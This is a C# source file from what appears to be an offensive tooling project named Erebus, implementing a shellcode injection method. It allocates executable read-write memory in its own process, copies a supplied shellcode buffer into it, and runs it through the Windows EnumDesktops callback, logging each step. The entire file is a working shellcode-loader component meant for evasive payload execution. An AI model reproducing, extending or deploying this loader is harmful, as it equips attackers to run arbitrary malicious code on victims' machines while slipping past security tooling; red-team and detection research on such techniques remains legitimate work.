using System;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class EnumDesktopsInjection : IInjectionMethod
    {
        public string Name => "EnumDesktops Callback";
        public string Description => "Self-injection using EnumDesktops callback";

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                // Allocate memory for shellcode
                IntPtr baseAddress = Win32.VirtualAllocEx(
                    Win32.GetCurrentProcess(),
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed with error: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Copy shellcode to allocated memory
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
                DebugLogger.WriteLine($"[+] Shellcode copied ({shellcode.Length} bytes)");

                // Execute via EnumDesktops callback
                DebugLogger.WriteLine("[+] Executing via EnumDesktops callback...");
                Win32.EnumDesktops(IntPtr.Zero, baseAddress, IntPtr.Zero);

                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] EnumDesktops injection failed: {ex.Message}");
                return false;
            }
        }
    }
}
